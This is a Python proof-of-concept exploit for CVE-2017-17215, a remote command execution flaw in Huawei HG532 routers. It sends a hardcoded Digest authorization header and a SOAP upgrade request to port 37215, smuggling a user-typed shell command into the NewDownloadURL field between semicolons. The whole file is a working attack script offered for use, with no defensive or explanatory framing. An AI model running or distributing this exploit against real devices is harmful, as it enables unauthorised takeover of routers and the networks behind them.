import requests

Authorization = "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
headers = {"Authorization": Authorization}

print("-----CVE-2017-17215 HUAWEI HG532 RCE-----\n")
cmd = input("command > ")

data = f'''
<?xml version="1.0" ?>
<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
            <NewStatusURL>winmt</NewStatusURL>
            <NewDownloadURL>;{cmd};</NewDownloadURL>
        </u:Upgrade>
    </s:Body>
</s:Envelope>
'''

r = requests.post('http://192.168.142.131:37215/ctrlt/DeviceUpgrade_1', headers = headers, data = data)
print("\nstatus_code: " + str(r.status_code))
print("\n" + r.text)
